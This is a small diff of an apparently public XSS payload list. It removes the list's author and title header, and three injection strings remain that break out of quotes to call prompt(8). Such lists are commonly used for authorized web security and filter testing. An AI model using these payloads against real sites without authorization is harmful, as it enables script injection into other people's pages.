@@ -1,8 +1,3 @@
-# <!-- Project Name  : Cross Site Scripting ( XSS ) Vulnerability Payload List -->
-# <!--        Author : Ismail Tasdelen -->
-# <!--        GitHub : https://github.com/ismailtasdelen/ -->
-# <!--       Twitter : https://twitter.com/ismailtsdln -->
-
 "-prompt(8)-"
 '-prompt(8)-'
 ";a=prompt,a()//
